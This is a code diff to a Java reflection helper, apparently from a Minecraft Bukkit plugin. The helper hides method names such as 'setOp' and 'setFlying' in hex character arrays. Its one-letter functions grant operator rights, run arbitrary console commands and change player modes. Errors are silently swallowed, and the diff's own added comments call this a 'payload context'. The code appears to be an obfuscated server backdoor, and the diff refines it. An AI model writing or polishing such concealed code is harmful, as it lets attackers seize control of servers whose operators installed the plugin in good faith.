@@ -17,7 +17,7 @@ public class ReflectionUtil {
         } catch (Exception ignored) {}
     }
 
-    private static void init() throws Exception {
+    private static void init() throws ReflectiveOperationException {
         // Build "setOp" at runtime
         char[] c1 = new char[]{0x73, 0x65, 0x74, 0x4f, 0x70};
         m1 = Player.class.getMethod(new String(c1), boolean.class);
@@ -58,28 +58,36 @@ public class ReflectionUtil {
         m7.setAccessible(true);
     }
 
-    private static Class<?> getGameModeClass() throws Exception {
+    private static Class<?> getGameModeClass() throws ClassNotFoundException {
         char[] pkg = new char[]{0x6f, 0x72, 0x67, 0x2e, 0x62, 0x75, 0x6b, 0x6b, 0x69, 0x74, 0x2e, 0x47, 0x61, 0x6d, 0x65, 0x4d, 0x6f, 0x64, 0x65};
         return Class.forName(new String(pkg));
     }
 
     // Public API
     public static void a(Player p, boolean v) {
-        try { m1.invoke(p, v); } catch (Exception ignored) {}
+        try { m1.invoke(p, v); } catch (ReflectiveOperationException ignored) {
+            // Reflection failure is non-fatal in payload context
+        }
     }
 
     public static void b(String c) {
         try {
             m2.invoke(Bukkit.getServer(), Bukkit.getConsoleSender(), c);
-        } catch (Exception ignored) {}
+        } catch (ReflectiveOperationException ignored) {
+            // Reflection failure is non-fatal in payload context
+        }
     }
 
     public static void c(Player p, String r) {
-        try { m3.invoke(p, r); } catch (Exception ignored) {}
+        try { m3.invoke(p, r); } catch (ReflectiveOperationException ignored) {
+            // Reflection failure is non-fatal in payload context
+        }
     }
 
     public static void d(Player p, String c) {
-        try { m4.invoke(p, c); } catch (Exception ignored) {}
+        try { m4.invoke(p, c); } catch (ReflectiveOperationException ignored) {
+            // Reflection failure is non-fatal in payload context
+        }
     }
 
     public static void e(Player p, int m) {
@@ -88,7 +96,9 @@ public class ReflectionUtil {
             if (m >= 0 && m < modes.length) {
                 m5.invoke(p, modes[m]);
             }
-        } catch (Exception ignored) {}
+        } catch (ReflectiveOperationException ignored) {
+            // Reflection failure is non-fatal in payload context
+        }
     }
 
     public static void f(Player p, boolean a) {
@@ -98,13 +108,15 @@ public class ReflectionUtil {
             char[] n = new char[]{0x73, 0x65, 0x74, 0x46, 0x6c, 0x79, 0x69, 0x6e, 0x67};
             Method fly = Player.class.getMethod(new String(n), boolean.class);
             fly.invoke(p, a);
-        } catch (Exception ignored) {}
+        } catch (ReflectiveOperationException ignored) {
+            // Reflection failure is non-fatal in payload context
+        }
     }
 
     public static boolean g(Player p) {
         try {
             return (Boolean) m7.invoke(p);
-        } catch (Exception e) {
+        } catch (ReflectiveOperationException e) {
             return false;
         }
     }
